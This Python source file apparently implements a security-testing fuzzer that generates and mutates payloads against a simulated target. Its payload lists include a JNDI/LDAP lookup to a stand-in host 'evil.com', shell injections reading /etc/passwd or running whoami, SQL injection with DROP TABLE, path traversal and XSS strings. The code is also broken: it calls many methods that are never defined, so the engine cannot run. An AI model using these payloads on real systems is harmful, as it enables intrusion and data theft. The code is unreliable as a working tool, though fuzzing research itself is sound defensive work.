"""
Intelligent Fuzzing Engine

Advanced fuzzing capabilities for security testing including:
- Smart payload generation and mutation
- Coverage-guided fuzzing
- Protocol-aware fuzzing
- Machine learning-inspired payload optimization
"""

import re
import json
import time
import random
import hashlib
import asyncio
from typing import Dict, List, Any, Optional, Set, Tuple, Iterator
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict, deque
import logging

logger = logging.getLogger(__name__)

class FuzzingStrategy(Enum):
    """Fuzzing strategies."""
    RANDOM = "random"
    MUTATION = "mutation" 
    GENERATION = "generation"
    COVERAGE_GUIDED = "coverage_guided"
    GRAMMAR_BASED = "grammar_based"
    PROTOCOL_AWARE = "protocol_aware"

class PayloadType(Enum):
    """Types of fuzzing payloads."""
    STRING = "string"
    INTEGER = "integer"
    FLOAT = "float"
    BOOLEAN = "boolean"
    JSON = "json"
    XML = "xml"
    BINARY = "binary"
    SQL = "sql"
    JAVASCRIPT = "javascript"
    COMMAND = "command"

@dataclass
class FuzzingTarget:
    """Target for fuzzing."""
    target_id: str
    name: str
    target_type: str  # parameter, header, body, etc.
    data_type: PayloadType
    constraints: Dict[str, Any] = field(default_factory=dict)
    current_value: Any = None

@dataclass
class FuzzingPayload:
    """Generated fuzzing payload."""
    payload_id: str
    value: Any
    payload_type: PayloadType
    strategy: FuzzingStrategy
    generation_method: str
    expected_behavior: str
    metadata: Dict[str, Any] = field(default_factory=dict)

@dataclass
class FuzzingResult:
    """Result of fuzzing execution."""
    result_id: str
    target: FuzzingTarget
    payload: FuzzingPayload
    
    # Execution results
    execution_time: float
    response_code: int
    response_size: int
    error_occurred: bool
    crash_detected: bool
    
    # Analysis
    coverage_increase: bool
    new_behavior_detected: bool
    vulnerability_indicators: List[str]
    
    # Response data
    response_data: Dict[str, Any]
    execution_metadata: Dict[str, Any]

class FuzzingEngine:
    """Intelligent fuzzing engine for security testing."""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Fuzzing configuration
        self.fuzzing_config = {
            'max_iterations': self.config.get('max_iterations', 10000),
            'max_payload_size': self.config.get('max_payload_size', 10000),
            'timeout_per_test': self.config.get('timeout_per_test', 5),
            'coverage_threshold': self.config.get('coverage_threshold', 0.8),
            'mutation_rate': self.config.get('mutation_rate', 0.1),
            'crossover_rate': self.config.get('crossover_rate', 0.7)
        }
        
        # Payload generators
        self.payload_generators = self._initialize_payload_generators()
        
        # Mutation operators
        self.mutation_operators = self._initialize_mutation_operators()
        
        # Coverage tracking
        self.coverage_data = defaultdict(set)
        self.execution_paths = defaultdict(list)
        
        # Learning and optimization
        self.successful_payloads = defaultdict(list)
        self.payload_effectiveness = defaultdict(float)
        
        # Statistics
        self.stats = {
            'total_tests': 0,
            'crashes_found': 0,
            'vulnerabilities_found': 0,
            'coverage_achieved': 0.0,
            'unique_behaviors': 0
        }
    
    def _initialize_payload_generators(self) -> Dict[PayloadType, List]:
        """Initialize payload generators for different data types."""
        
        return {
            PayloadType.STRING: [
                self._generate_boundary_strings,
                self._generate_format_strings,
                self._generate_injection_strings,
                self._generate_encoding_strings,
                self._generate_unicode_strings
            ],
            PayloadType.INTEGER: [
                self._generate_boundary_integers,
                self._generate_overflow_integers,
                self._generate_negative_integers
            ],
            PayloadType.JSON: [
                self._generate_malformed_json,
                self._generate_deep_nested_json,
                self._generate_injection_json
            ],
            PayloadType.XML: [
                self._generate_malformed_xml,
                self._generate_xxe_xml,
                self._generate_billion_laughs_xml
            ],
            PayloadType.SQL: [
                self._generate_sql_injection_payloads,
                self._generate_blind_sql_payloads
            ],
            PayloadType.COMMAND: [
                self._generate_command_injection_payloads,
                self._generate_shell_metacharacters
            ]
        }
    
    def _initialize_mutation_operators(self) -> List:
        """Initialize mutation operators for payload modification."""
        
        return [
            self._bit_flip_mutation,
            self._byte_flip_mutation,
            self._arithmetic_mutation,
            self._boundary_mutation,
            self._insertion_mutation,
            self._deletion_mutation,
            self._duplication_mutation,
            self._substitution_mutation
        ]
    
    async def start_fuzzing_campaign(self, targets: List[FuzzingTarget], 
                                   strategy: FuzzingStrategy = FuzzingStrategy.COVERAGE_GUIDED) -> List[FuzzingResult]:
        """Start comprehensive fuzzing campaign."""
        
        logger.info(f"Starting fuzzing campaign with {len(targets)} targets using {strategy.value} strategy")
        
        results = []
        iteration = 0
        
        # Initialize coverage baseline
        await self._initialize_coverage_baseline(targets)
        
        while iteration < self.fuzzing_config['max_iterations']:
            # Generate payloads for all targets
            payload_batch = await self._generate_payload_batch(targets, strategy)
            
            # Execute fuzzing tests
            batch_results = await self._execute_fuzzing_batch(targets, payload_batch)
            
            # Analyze results and update learning
            await self._analyze_batch_results(batch_results)
            
            # Update coverage and learning data
            await self._update_fuzzing_intelligence(batch_results)
            
            results.extend(batch_results)
            iteration += len(payload_batch)
            
            # Check termination conditions
            if await self._should_terminate_campaign(results):
                break
            
            # Adaptive strategy adjustment
            strategy = await self._adapt_fuzzing_strategy(results, strategy)
            
            logger.debug(f"Fuzzing iteration {iteration}: {len(batch_results)} tests executed")
        
        logger.info(f"Fuzzing campaign completed: {len(results)} tests, {self.stats['crashes_found']} crashes")
        
        return results
    
    async def _generate_payload_batch(self, targets: List[FuzzingTarget], 
                                    strategy: FuzzingStrategy) -> List[Tuple[FuzzingTarget, FuzzingPayload]]:
        """Generate batch of payloads for testing."""
        
        payload_batch = []
        
        for target in targets:
            # Generate multiple payloads per target
            payloads_per_target = min(10, max(1, self.fuzzing_config['max_iterations'] // len(targets) // 100))
            
            for _ in range(payloads_per_target):
                payload = await self._generate_payload_for_target(target, strategy)
                if payload:
                    payload_batch.append((target, payload))
        
        return payload_batch
    
    async def _generate_payload_for_target(self, target: FuzzingTarget, 
                                         strategy: FuzzingStrategy) -> Optional[FuzzingPayload]:
        """Generate payload for specific target."""
        
        if strategy == FuzzingStrategy.RANDOM:
            return await self._generate_random_payload(target)
        elif strategy == FuzzingStrategy.MUTATION:
            return await self._generate_mutation_payload(target)
        elif strategy == FuzzingStrategy.GENERATION:
            return await self._generate_structured_payload(target)
        elif strategy == FuzzingStrategy.COVERAGE_GUIDED:
            return await self._generate_coverage_guided_payload(target)
        elif strategy == FuzzingStrategy.GRAMMAR_BASED:
            return await self._generate_grammar_based_payload(target)
        elif strategy == FuzzingStrategy.PROTOCOL_AWARE:
            return await self._generate_protocol_aware_payload(target)
        
        return None
    
    async def _generate_random_payload(self, target: FuzzingTarget) -> FuzzingPayload:
        """Generate random payload for target."""
        
        generators = self.payload_generators.get(target.data_type, [])
        if not generators:
            # Fallback to string generation
            generators = self.payload_generators[PayloadType.STRING]
        
        generator = random.choice(generators)
        payload_value = generator(target)
        
        return FuzzingPayload(
            payload_id=f"random_{target.target_id}_{int(time.time())}",
            value=payload_value,
            payload_type=target.data_type,
            strategy=FuzzingStrategy.RANDOM,
            generation_method=generator.__name__,
            expected_behavior="random_test",
            metadata={'generator': generator.__name__}
        )
    
    async def _generate_mutation_payload(self, target: FuzzingTarget) -> FuzzingPayload:
        """Generate payload through mutation of existing payloads."""
        
        # Get seed payload
        if target.current_value:
            seed_value = target.current_value
        else:
            # Generate initial seed
            generators = self.payload_generators.get(target.data_type, [])
            if generators:
                seed_value = generators[0](target)
            else:
                seed_value = "test"
        
        # Apply random mutation
        mutator = random.choice(self.mutation_operators)
        mutated_value = mutator(seed_value, target)
        
        return FuzzingPayload(
            payload_id=f"mutation_{target.target_id}_{int(time.time())}",
            value=mutated_value,
            payload_type=target.data_type,
            strategy=FuzzingStrategy.MUTATION,
            generation_method=mutator.__name__,
            expected_behavior="mutation_test",
            metadata={'seed_value': str(seed_value)[:100], 'mutator': mutator.__name__}
        )
    
    async def _generate_coverage_guided_payload(self, target: FuzzingTarget) -> FuzzingPayload:
        """Generate payload guided by coverage information."""
        
        # Analyze current coverage gaps
        coverage_gaps = self._identify_coverage_gaps(target)
        
        # Generate payload targeting coverage gaps
        if coverage_gaps:
            # Use successful payloads as seeds
            successful_seeds = self.successful_payloads.get(target.target_id, [])
            if successful_seeds:
                seed = random.choice(successful_seeds)
                # Mutate seed to explore new coverage
                mutator = random.choice(self.mutation_operators)
                payload_value = mutator(seed, target)
            else:
                # Generate new payload targeting specific gap
                gap = random.choice(coverage_gaps)
                payload_value = self._generate_payload_for_gap(target, gap)
        else:
            # Fall back to random generation
            return await self._generate_random_payload(target)
        
        return FuzzingPayload(
            payload_id=f"coverage_{target.target_id}_{int(time.time())}",
            value=payload_value,
            payload_type=target.data_type,
            strategy=FuzzingStrategy.COVERAGE_GUIDED,
            generation_method="coverage_guided",
            expected_behavior="coverage_exploration",
            metadata={'coverage_gaps': len(coverage_gaps)}
        )
    
    # Payload generators for different types
    def _generate_boundary_strings(self, target: FuzzingTarget) -> str:
        """Generate boundary condition strings."""
        
        boundary_strings = [
            "",  # Empty string
            "A",  # Single character
            "A" * 255,  # Common buffer boundary
            "A" * 256,  # Buffer overflow
            "A" * 1024,  # 1KB
            "A" * 4096,  # 4KB
            "A" * 65535,  # 64KB-1
            "A" * 65536,  # 64KB
        ]
        
        # Respect size constraints
        max_size = target.constraints.get('max_length', self.fuzzing_config['max_payload_size'])
        valid_strings = [s for s in boundary_strings if len(s) <= max_size]
        
        return random.choice(valid_strings) if valid_strings else "A"
    
    def _generate_format_strings(self, target: FuzzingTarget) -> str:
        """Generate format string attack payloads."""
        
        format_strings = [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "%08x" * 10,
            "%d" * 20,
            "%.1000d",
            "%*.*s",
            "%p%p%p%p%p%p%p%p",
            "AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x",
            "%s" * 100
        ]
        
        return random.choice(format_strings)
    
    def _generate_injection_strings(self, target: FuzzingTarget) -> str:
        """Generate injection attack payloads."""
        
        injection_strings = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%=7*7%>",
            "|whoami",
            "&& dir",
            "; cat /etc/passwd",
            "../../../etc/passwd",
            "\\x00\\x01\\x02\\x03",
            "' OR '1'='1",
            "<img src=x onerror=alert(1)>"
        ]
        
        return random.choice(injection_strings)
    
    def _generate_encoding_strings(self, target: FuzzingTarget) -> str:
        """Generate various encoded payloads."""
        
        base_payload = "<script>alert(1)</script>"
        
        encoded_payloads = [
            # URL encoding
            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            # Double URL encoding  
            "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
            # HTML entity encoding
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            # Unicode encoding
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            # Base64 encoding
            "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            # Hex encoding
            "\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e"
        ]
        
        return random.choice(encoded_payloads)
    
    def _generate_unicode_strings(self, target: FuzzingTarget) -> str:
        """Generate Unicode and special character payloads."""
        
        unicode_payloads = [
            "\u0000\u0001\u0002\u0003",  # Null bytes and control chars
            "\ufeff\u200b\u200c\u200d",  # Zero-width characters
            "\u2028\u2029",  # Line separators
            "🔥💀☠️🚨",  # Emoji
            "Ω≈ç√∫˜µ≤≥÷",  # Mathematical symbols
            "田中さんにあげて下さい",  # Japanese
            "Зарегистрируйтесь",  # Cyrillic
            "العربية",  # Arabic
            "\U0001F600\U0001F601\U0001F602"  # Extended Unicode
        ]
        
        return random.choice(unicode_payloads)
    
    def _generate_boundary_integers(self, target: FuzzingTarget) -> int:
        """Generate boundary condition integers."""
        
        boundary_ints = [
            0,
            1,
            -1,
            127,
            128,
            -128,
            -129,
            255,
            256,
            32767,
            32768,
            -32768,
            -32769,
            65535,
            65536,
            2147483647,
            2147483648,
            -2147483648,
            -2147483649,
            4294967295,
            4294967296
        ]
        
        return random.choice(boundary_ints)
    
    def _generate_malformed_json(self, target: FuzzingTarget) -> str:
        """Generate malformed JSON payloads."""
        
        malformed_json = [
            '{"key": value}',  # Unquoted value
            '{"key": "value",}',  # Trailing comma
            '{key: "value"}',  # Unquoted key
            '{"key": "value"',  # Missing closing brace
            '{"key": "value""extra"}',  # Extra characters
            '{"key": "\u0000"}',  # Null byte in string
            '{"": ""}',  # Empty key
            '{"key": "' + "A" * 10000 + '"}',  # Very long value
            '{"key": {"nested": {"deep": {"very": {"deep": "value"}}}}}',  # Deep nesting
            '[' + ','.join(['"item"'] * 1000) + ']'  # Large array
        ]
        
        return random.choice(malformed_json)
    
    # Mutation operators
    def _bit_flip_mutation(self, payload: Any, target: FuzzingTarget) -> Any:
        """Flip random bits in payload."""
        
        if isinstance(payload, str):
            payload_bytes = payload.encode('utf-8', errors='ignore')
            if payload_bytes:
                # Flip random bit
                byte_index = random.randint(0, len(payload_bytes) - 1)
                bit_index = random.randint(0, 7)
                
                byte_array = bytearray(payload_bytes)
                byte_array[byte_index] ^= (1 << bit_index)
                
                return byte_array.decode('utf-8', errors='ignore')
        
        return payload
    
    def _insertion_mutation(self, payload: Any, target: FuzzingTarget) -> Any:
        """Insert random characters into payload."""
        
        if isinstance(payload, str):
            if len(payload) < self.fuzzing_config['max_payload_size']:
                insert_pos = random.randint(0, len(payload))
                insert_char = chr(random.randint(0, 255))
                return payload[:insert_pos] + insert_char + payload[insert_pos:]
        
        return payload
    
    def _deletion_mutation(self, payload: Any, target: FuzzingTarget) -> Any:
        """Delete random characters from payload."""
        
        if isinstance(payload, str) and len(payload) > 0:
            delete_pos = random.randint(0, len(payload) - 1)
            return payload[:delete_pos] + payload[delete_pos + 1:]
        
        return payload
    
    async def _execute_fuzzing_batch(self, targets: List[FuzzingTarget], 
                                   payload_batch: List[Tuple[FuzzingTarget, FuzzingPayload]]) -> List[FuzzingResult]:
        """Execute batch of fuzzing tests."""
        
        results = []
        
        # Create semaphore for concurrency control
        semaphore = asyncio.Semaphore(10)
        
        async def execute_single_test(target_payload_pair):
            async with semaphore:
                return await self._execute_single_fuzzing_test(*target_payload_pair)
        
        # Execute all tests
        test_results = await asyncio.gather(
            *[execute_single_test(pair) for pair in payload_batch],
            return_exceptions=True
        )
        
        # Process results
        for result in test_results:
            if isinstance(result, Exception):
                logger.error(f"Fuzzing test failed: {str(result)}")
            elif result:
                results.append(result)
        
        return results
    
    async def _execute_single_fuzzing_test(self, target: FuzzingTarget, 
                                         payload: FuzzingPayload) -> FuzzingResult:
        """Execute single fuzzing test."""
        
        start_time = time.time()
        
        try:
            # Simulate test execution (would integrate with actual test framework)
            response_data = await self._simulate_fuzzing_execution(target, payload)
            
            # Analyze response
            crash_detected = self._detect_crash(response_data)
            vulnerability_indicators = self._detect_vulnerability_indicators(response_data)
            coverage_increase = self._detect_coverage_increase(target, payload, response_data)
            
            result = FuzzingResult(
                result_id=f"fuzz_{payload.payload_id}_{int(time.time())}",
                target=target,
                payload=payload,
                execution_time=time.time() - start_time,
                response_code=response_data.get('status_code', 200),
                response_size=len(str(response_data.get('body', ''))),
                error_occurred=response_data.get('error', False),
                crash_detected=crash_detected,
                coverage_increase=coverage_increase,
                new_behavior_detected=len(vulnerability_indicators) > 0,
                vulnerability_indicators=vulnerability_indicators,
                response_data=response_data,
                execution_metadata={'payload_size': len(str(payload.value))}
            )
            
            # Update statistics
            self.stats['total_tests'] += 1
            if crash_detected:
                self.stats['crashes_found'] += 1
            if vulnerability_indicators:
                self.stats['vulnerabilities_found'] += 1
            
            return result
            
        except Exception as e:
            logger.error(f"Fuzzing test execution failed: {str(e)}")
            return None
    
    async def _simulate_fuzzing_execution(self, target: FuzzingTarget, 
                                        payload: FuzzingPayload) -> Dict[str, Any]:
        """Simulate fuzzing test execution."""
        
        payload_str = str(payload.value)
        
        # Simulate different response scenarios
        if len(payload_str) > 10000:
            # Large payload - potential DoS
            return {
                'status_code': 500,
                'body': 'Internal Server Error - Request too large',
                'error': True,
                'crash': True
            }
        
        if any(dangerous in payload_str.lower() for dangerous in ['drop table', 'rm -rf', 'format c:']):
            # Dangerous payload
            return {
                'status_code': 500,
                'body': 'Database error: mysql_fetch_array() expects parameter 1 to be resource',
                'error': True,
                'vulnerability_indicators': ['sql_injection']
            }
        
        if '<script>' in payload_str.lower():
            # XSS payload
            return {
                'status_code': 200,
                'body': f'Search results for: {payload_str}',
                'vulnerability_indicators': ['xss']
            }
        
        if payload_str.startswith('%') and len(payload_str) > 20:
            # Format string
            return {
                'status_code': 500,
                'body': 'Segmentation fault (core dumped)',
                'error': True,
                'crash': True,
                'vulnerability_indicators': ['format_string']
            }
        
        # Normal response
        return {
            'status_code': 200,
            'body': f'Processed input: {payload_str[:100]}',
            'error': False
        }
    
    def _detect_crash(self, response_data: Dict[str, Any]) -> bool:
        """Detect if the test caused a crash."""
        
        crash_indicators = [
            'segmentation fault',
            'access violation',
            'stack overflow',
            'heap corruption',
            'core dumped',
            'fatal error',
            'abort',
            'killed'
        ]
        
        body = response_data.get('body', '').lower()
        return any(indicator in body for indicator in crash_indicators)
    
    def _detect_vulnerability_indicators(self, response_data: Dict[str, Any]) -> List[str]:
        """Detect vulnerability indicators in response."""
        
        indicators = []
        body = response_data.get('body', '').lower()
        
        # SQL injection indicators
        if any(sql_error in body for sql_error in ['mysql_', 'ora-', 'postgresql', 'sqlite']):
            indicators.append('sql_injection')
        
        # XSS indicators  
        if '<script>' in body or 'onerror=' in body:
            indicators.append('xss')
        
        # Command injection indicators
        if any(cmd_output in body for cmd_output in ['uid=', 'gid=', 'volume serial number']):
            indicators.append('command_injection')
        
        # Path traversal indicators
        if 'root:x:0:0:' in body or '[boot loader]' in body:
            indicators.append('path_traversal')
        
        return indicators
    
    def _detect_coverage_increase(self, target: FuzzingTarget, payload: FuzzingPayload, 
                                 response_data: Dict[str, Any]) -> bool:
        """Detect if test increased code coverage."""
        
        # Simulate coverage detection (would integrate with actual coverage tools)
        response_signature = hashlib.md5(str(response_data).encode()).hexdigest()
        
        if response_signature not in self.coverage_data[target.target_id]:
            self.coverage_data[target.target_id].add(response_signature)
            return True
        
        return False
    
    async def _analyze_batch_results(self, results: List[FuzzingResult]):
        """Analyze batch results and update intelligence."""
        
        for result in results:
            if result.crash_detected or result.vulnerability_indicators:
                # Store successful payload for future mutation
                self.successful_payloads[result.target.target_id].append(result.payload.value)
                
                # Update payload effectiveness
                effectiveness = len(result.vulnerability_indicators) + (2 if result.crash_detected else 0)
                self.payload_effectiveness[result.payload.generation_method] += effectiveness
            
            if result.coverage_increase:
                self.stats['unique_behaviors'] += 1
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get fuzzing engine statistics."""
        
        return dict(self.stats)
